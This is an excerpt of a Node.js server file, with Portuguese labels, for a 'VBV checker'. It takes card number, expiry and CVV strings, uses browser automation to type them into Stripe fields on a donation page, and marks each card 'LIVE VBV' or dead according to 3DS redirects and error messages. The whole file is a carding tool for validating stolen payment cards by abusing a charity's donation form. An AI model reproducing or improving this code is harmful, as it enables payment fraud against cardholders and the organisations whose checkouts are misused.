// server.js - VBV CHECKER PARA RENDER
...
app.post('/check', async (req, res) => {
    ...
    if (!card || !card.includes('|')) {
        return res.json({ status: 'RECUSADA', message: 'Cartão inválido' });
    }
    
    const hash = crypto.randomBytes(8).toString('hex');
    const resultFile = path.join(resultsDir, hash + '.json');
    
    // Rodar em background (não usar await)
    checkCard(card, resultFile).catch(err => {
        console.error('Erro no check:', err);
        const finalResult = { status: 'RECUSADA', message: 'Erro: ' + err.message };
        fs.writeFileSync(resultFile, JSON.stringify(finalResult));
    });
    
    res.json({ status: 'WAIT', hash: hash });
});

app.get('/poll/:hash', (req, res) => {
    const resultFile = path.join(resultsDir, req.params.hash + '.json');
...
async function fillCardFields(page, card) {
    await sleep(1500);
    await typeInStripeField(page, 'input[name="cardnumber"], input[data-elements-stable-field-name="cardNumber"], input[autocomplete="cc-number"]', card.pan);
    await sleep(300);
    const expDate = `${card.mes}${card.ano.slice(-2)}`;
    await typeInStripeField(page, 'input[name="exp-date"], input[data-elements-stable-field-name="cardExpiry"], input[autocomplete="cc-exp"]', expDate);
    await sleep(300);
    const cvcOk = await typeInStripeField(page, 'input[name="cvc"], input[data-elements-stable-field-name="cardCvc"], input[autocomplete="cc-csc"]', card.cvv);
    if (!cvcOk) {
        for (const frame of page.frames()) {
            if (!frame.url().includes('stripe.com')) continue;
...
async function detect3DS(page) {
    ...
    return new Promise(resolve => {
        const check = async () => {
            ...
            if (elapsed > MAX) { resolve({ status: 'live_3ds', trigger: 'timeout_3ds', details: null }); return; }
            if (url && url.includes('/donation-confirmation/')) { resolve({ status: 'dead', trigger: 'donation_confirmation', details: null }); return; }
            if (elapsed >= 2000) {
                ...
                if (!loading) {
                    ...
                    if (dead) { resolve({ status: 'dead', trigger: dead, details: null }); return; }
                }
            }
...
async function waitForInitialResponse(page) {
    ...
    return new Promise(resolve => {
        const check = async () => {
            ...
            if (url && url.includes('/donation-confirmation/')) { resolve({ status: 'dead', trigger: 'donation_confirmation' }); return; }
            if (url && url.includes('hooks.stripe.com')) { resolve({ status: 'redirected_stripe' }); return; }
            const errorMsg = await safeEvaluate(page, () => {
                const els = document.querySelectorAll('.give-errors, .give_error');
                for (const el of els) { if (el.offsetHeight > 0 && el.innerText.trim().length > 0) return el.innerText.trim(); }
                return null;
            }, null);
            if (errorMsg) { resolve({ status: 'dead', trigger: errorMsg.substring(0, 50) }); return; }
...
async function clickDonateAndDetect(page) {
    ...
    } catch { return { status: 'dead', trigger: 'no_button' }; }
...
async function checkCard(cardString, resultFile) {
    console.log(`🚀 Check: ${cardString}`);
    const [pan, mes, ano, cvv] = cardString.split('|');
    const card = { pan: pan.trim(), mes: mes.trim().padStart(2, '0'), ano: ano.trim(), cvv: cvv.trim() };
    ...
    try {
        ...
        if (result.status.startsWith('live')) {
            ...
            finalResult = { status: 'LIVE VBV', message: message };
        } else {
            finalResult = { status: 'RECUSADA', message: '❌ DEAD - ' + result.trigger };
        }
        fs.writeFileSync(resultFile, JSON.stringify(finalResult));
...
app.listen(PORT, () => {
    console.log(`🔥 VBV Checker rodando na porta ${PORT}`);
});
